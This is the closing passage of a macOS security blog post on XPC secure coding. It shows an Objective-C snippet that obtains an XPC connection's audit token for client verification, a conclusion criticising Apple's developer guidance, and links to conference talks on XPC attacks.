<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span> : <span style="color:#0a8;font-weight:bold">NSXPCConnection</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>   audit_token_t auditToken;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span> audit_token_t auditToken;
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@implementation</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">@synthesize</span> auditToken;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(...)
</span></span><span style="display:flex;"><span><span style="color:#555">-</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#99f">listener</span>:(NSXPCListener <span style="color:#555">*</span>)listener <span style="color:#99f">shouldAcceptNewConnection</span>:(NSXPCConnection <span style="color:#555">*</span>)newConnection
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>(...)
</span></span><span style="display:flex;"><span>    auditToken <span style="color:#555">=</span> ((ExtendedNSXPCConnection<span style="color:#555">*</span>)newConnection).auditToken;
</span></span><span style="display:flex;"><span>(...)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>This concludes my series I planned in XPC exploitation and secure coding, I hope these posts find their way to developers, as in my experience most of the applications are not done right. Unfortunately the only one to blame for this is Apple, as they don&rsquo;t provide clear best practices for developers, neither secure public APIs. I hope this will change in the future.</p>
<h2 id="further-resources">
  Further resources
  <a class="heading-link" href="#further-resources">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>If you are interested reading more about XPC attacks I recommend four talks:</p>
<ol>
<li>Wojciech Reguła ( <a href="https://twitter.com/_r3ggi"  class="external-link" target="_blank" rel="noopener">@_r3ggi</a> ): Abusing and Securing XPC in macOS Apps <a href="https://objectivebythesea.com/v3/content.html"  class="external-link" target="_blank" rel="noopener">Objective by the Sea v3</a></li>
<li>Julia Vashchenko ( <a href="https://twitter.com/iaronskaya"  class="external-link" target="_blank" rel="noopener">@iaronskaya</a> ): Job(s) Bless Us! Privileged Operations on macOS <a href="https://objectivebythesea.com/v3/content.html"  class="external-link" target="_blank" rel="noopener">Objective by the Sea v3</a></li>
<li>Tyler Bohan ( <a href="https://twitter.com/1blankwall1"  class="external-link" target="_blank" rel="noopener">@1blankwall1</a> ): OSX XPC Revisited - 3rd Party Application Flaws <a href="https://www.youtube.com/watch?v=KPzhTqwf0bA"  class="external-link" target="_blank" rel="noopener">OffensiveCon 19 - YouTube</a></li>
<li>Ian Beer ( <a href="https://twitter.com/i41nbeer"  class="external-link" target="_blank" rel="noopener">@i41nbeer</a> ): A deep-dive into the many flavors of IPC available on OS X <a href="https://vimeopro.com/cyberwire/jailbreak-security-summit/video/127859750"  class="external-link" target="_blank" rel="noopener">Jailbreak Security Summit 2015 on Vimeo</a></li>
</ol>
<p><a href="https://twitter.com/_r3ggi"  class="external-link" target="_blank" rel="noopener">@_r3ggi</a> has also a blog post detailing XPC exploits: <a href="https://wojciechregula.blog/post/"  class="external-link" target="_blank" rel="noopener">https://wojciechregula.blog/post</a></p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
    2024
     Csaba Fitzl 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
